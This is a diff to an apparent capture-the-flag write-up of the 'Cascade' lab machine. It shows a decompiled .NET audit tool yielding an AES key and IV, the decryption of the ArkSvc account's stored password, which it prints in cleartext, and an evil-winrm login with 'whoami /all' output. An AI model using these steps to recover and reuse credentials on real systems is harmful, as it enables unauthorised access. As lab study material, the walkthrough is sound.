@@ -311,7 +311,9 @@
         dr--r--r--                0 Tue Jan 28 15:42:18 2020	x64
         dr--r--r--                0 Tue Jan 28 15:42:18 2020	x86
     
-// We notice that there is exetubale file called 'CascAudit.exe' and 'CascCrypto.dll' library, We will back for that later
+// We notice that there is exetubale file called 'CascAudit.exe' and 'CascCrypto.dll' library and batch file called 'RunAudit.bat'
+
+// Lets download them and We will back for them later
 
 // Next i search in DB folder
 
@@ -359,12 +361,88 @@
     COMMIT;
     sqlite> 
 
-// When we dump Ldap content, we can see there user's ArkSvc hashed string(seems to be password)
+// When we dump Ldap content, we can see there user's ArkSvc hashed string(seems to be password with base64 encryption)
 
-// Searching many ways to decrypt that string didnt end with any results, so i think it  
+// Searching many ways to decrypt that string didnt end with any results, so i moved on for now to the 'CascCrypto.dll' file
 
-// It somehow kind connected with the exetubale file we find earlier in Audit$
+// That we found earlier in Audit$ folder() also there is other files ('RunAudit.bat' , 'CascAudit.exe') that seems to be realated.
+
+    $ strings 10.10.10.182-Audit_RunAudit.bat 
+    CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+
+// When view 'RunAudit.bat' content we can see that it 'CascAudit.exe' &  'Audit.db' are realated
+
+// When checking the filetype of 'CascAudit.exe' we can see its /.NET file
+
+    $ file 10.10.10.182-Audit_CascAudit.exe 
+    10.10.10.182-Audit_CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+// When openning CascAudit.exe with [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)(ILSpy for linux)
+
+    c4scadek3y654321
+
+![Image 1]()
+
+// There we can see a key, save him beside for now, and open 'CascCrypto.dll'
+
+![Image 2]()
+
+// There we can see the Encryption process and the IV key 
+
+input - 'BQO5l5Kj9MdErXx6Q6AGOw=='
+From Base64
+key - 'c4scadek3y654321'
+AES encryptin - 128 bits
+set IV key '1tdyjCbY1Ix49842'
+Cipher mode 1 (CBC)
+
+// Now that we have all information needed we can decrypt it using [CyberCheff](https://gchq.github.io/CyberChef/)
+
+![Image 3]()
+
+// So we have 'ArkSvc' creds 
+
+    ArkSvc : w3lc0meFr31nd
+
+// Lets try to get a shell
+
+    $ evil-winrm -i cascade.local -u ArkSvc -p w3lc0meFr31nd
+    
+    
+    *Evil-WinRM* PS C:\Users\Administrator> whoami /all
+
+    USER INFORMATION
+    ----------------
+
+    User Name      SID
+    ============== ==============================================
+    cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
 
 
+    GROUP INFORMATION
+    -----------------
+
+    Group Name                                  Type             SID                                            Attributes
+    =========================================== ================ ============================================== ===============================================================
+    Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+    CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+    CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+    CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+    CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
 
+    PRIVILEGES INFORMATION
+    ----------------------
+
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
